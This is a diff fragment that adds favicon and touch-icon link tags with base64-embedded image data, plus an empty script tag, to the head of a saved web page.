+    <link rel="shortcut icon" data-savepage-href="/favicon.ico" href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAC4jAAAuIwF4pT92AAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAACoElEQVR42mL8//8/AyUAIICYGCgEAAHE0tTUfk2e/4usDM+rPz//sjEwgkQZGRlALmNEooEMBpBbmYBMVqY/DPc+SbA8+8T+GCCAWIAy/L+YBHk0JE4ySAsdZ2D4B3MURBOMyQDzKdN/hpsvPRmuf1JnYGH6yQ8QQEzv3rz8v2nXEYZ1t7wYHn5yYmDg+M7AwMYDxFwMDOwgmhtoJRCzAzHnd4Yb74IY1l4zYdi6ey/D9+9f/gMEEAsLCyvDrl3bGL59+8bAzubD4MH2n0FOfCsDw19xoHX/oNYDAfNLhhuPoxi23zRmWL12McOTJ48YLEzNGAACiIWJmYmBi4ubYd++3Qwc7BxA9e4MnuwMDLLSQEP+iEFD6iXD7fsRDDuvmjOsWb+G4cL5swxycnJgfwEEEAsTMICYWVjA6rZt38zwH2jh79+ODL4sQJcobAOL37oZxrDljClQ82qG48eOgMVAgfv/338GgABiATkRZAgMsLEwMvz5x8Ww5YQjQxDXF4av33kYdp61BNrFBHQhK1zdf2joAgQQC0jvv3//wFxfHx8GTw8vBlc3Z4a/f5kZ1u0Ehh0bB0NAUBDD29fPGViY/wMxM8PuPXuA8n/BwQMQQCxAVzD8/PmTwcHBgcHHy4fB2cWJQUlZBWwgD08MAzNQg5i4KIOsnBTDr1+/wOI/gOqvXLkKthgggFj+AU1ysHdgcHVxZXBxdWZQUlGB+A+IJaUkwBpACkGJyczSkgFk4a+fvxhEhIUZ/vz5wwAQQCy8vHyMvl7eDNZ2tgw8/AIML1+9hvuTEZaAkNKUspoq2CXswPD48vUbI0AAsQBt+vjv/3++i+cv/AGZyIAUoLDQZkQWA/KZWZhBFMufv/8+AgQQI6W5ESCAKM6NAAEGACcb6fG/dzZGAAAAAElFTkSuQmCC">
+	<script language="javascript" data-savepage-type="text/javascript" type="text/plain"></script>
+    <link rel="icon" data-savepage-href="./pics/apple-touch-icon-precomposed.png" href="data:image/png;base64,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">
+    <link rel="icon" type="image/png" sizes="72x72" data-savepage-href="./pics/apple-touch-icon-72x72-precomposed.png" href="data:image/png;base64,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">
+    <link rel="icon" type="image/png" sizes="114x114" data-savepage-href="./pics/apple-touch-icon-114x114-precomposed.png" href="data:image/png;base64,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">
